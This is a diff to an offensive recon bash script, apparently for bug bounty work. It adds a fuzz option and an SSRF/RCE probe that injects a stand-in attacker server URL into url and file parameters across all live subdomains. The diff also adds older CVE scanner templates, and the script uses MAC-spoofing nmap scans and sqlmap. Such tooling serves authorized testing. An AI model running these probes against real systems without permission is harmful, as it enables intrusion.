@@ -19,12 +19,15 @@ usersList=./wordlist/top-users.txt
 # sort -u ../SecLists/Passwords/clarkson-university-82.txt ../SecLists/Passwords/cirt-default-passwords.txt ../SecLists/Passwords/darkweb2017-top100.txt ../SecLists/Passwords/probable-v2-top207.txt ./wordlist/passwords.txt -o wordlist/passwords.txt
 passwordsList=./wordlist/top-passwords.txt
 
+# Fuzzing using local server:
+ATTACKER=http://LOCALSERVERIP:PORT
 
 # optional positional arguments
 ip= # test for specific single IP
 cidr= # test for CIDR based on ASN number, see https://bgp.he.net/
 single= # if just one target in scope
 brute= # enable directory bruteforce
+fuzz= # enable parameter fuzzing (local server need to be alive)
 mad= # if you sad about subdomains count, call it
 alt= # permutate and alterate subdomains
 wildcard= # fight against multi-level wildcard DNS to avoid false-positive results while subdomain resolves
@@ -180,6 +183,7 @@ checkhttprobe(){
   httpx -silent -ports 80,443,100-200,8000,8080 -l $targetDir/dnsprobe_subdomains.txt -follow-host-redirects -threads 500 -o $targetDir/httpx_output_2.txt
 
   sort -u $targetDir/httpx_output_1.txt $targetDir/httpx_output_2.txt -o $targetDir/3-all-subdomain-live-scheme.txt
+  cat $targetDir/3-all-subdomain-live-scheme.txt | unfurl format '%d:%P' > $targetDir/3-all-subdomain-live.txt
 }
 
 aquatoneshot(){
@@ -199,6 +203,7 @@ nucleitest(){
                     -t ../nuclei-templates/vulnerabilities/other/ \
                     -t ../nuclei-templates/vulnerabilities/wordpress/ \
                     -t ../nuclei-templates/vulnerabilities/thinkphp/thinkphp-2-rce.yaml \
+                    -t ../nuclei-templates/cves/2016/ \
                     -t ../nuclei-templates/cves/2017/ \
                     -t ../nuclei-templates/cves/2018/ \
                     -t ../nuclei-templates/cves/2019/ \
@@ -287,6 +292,16 @@ hakrawlercrawling(){
   fi
 }
 
+# https://rez0.blog/hacking/2019/11/29/rce-via-imagetragick.html
+rcetest(){
+  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
+    echo "[SSRF/RCE] SSRF probe..."
+    ffuf -c -u HOST/\?url=$ATTACKER/DOMAIN/url\&file=$ATTACKER/DOMAIN/file \
+        -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
+        -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork -v
+  fi
+}
+
 sqlmaptest(){
   if [ "$mad" = "1" ]; then
     # prepare list of the php urls from wayback, hakrawler and gospider
@@ -371,7 +386,7 @@ nmap_nse(){
 
     # grep smtp /usr/local/Cellar/nmap/7.91/share/nmap/scripts/script.db
     # grep "intrusive" /usr/share/nmap/scripts/script.db
-    nmap --spoof-mac 0 -n -f -sV --version-intensity 9 --script=default,http-headers -sS -Pn -T4 -p$PORT -oG $targetDir/nmap/$FILENAME $IP
+    nmap --spoof-mac 0 -n -sV --version-intensity 9 --script=default,http-headers -sS -Pn -T4 -p$PORT -oG $targetDir/nmap/$FILENAME $IP
     echo
     echo
   done < $targetDir/masscan_output.gnmap
@@ -434,6 +449,10 @@ recon(){
   if [ "$mad" = "1" ]; then
     gospidertest $1
     hakrawlercrawling $1
+  fi
+
+  if [[ -n "$fuzz" ]]; then
+    rcetest $1
   fi
 
   sqlmaptest $1
@@ -565,6 +584,8 @@ checkargs(){
                                   ;;
           -b | --brute )          brute="1"
                                   ;;
+          -f | --fuzz )           fuzz="1"
+                                  ;;
           -m | --mad )            mad="1"
                                   ;;
           -a | --alt )            alt="1"
@@ -603,6 +624,7 @@ echo "Check params \$ip: $ip"
 echo "Check params \$cidr: $cidr"
 echo "Check params \$single: $single"
 echo "Check params \$brute: $brute"
+echo "Check params \$fuzz: $fuzz"
 echo "Check params \$mad: $mad"
 echo "Check params \$alt: $alt"
 echo "Check params \$wildcard: $wildcard"
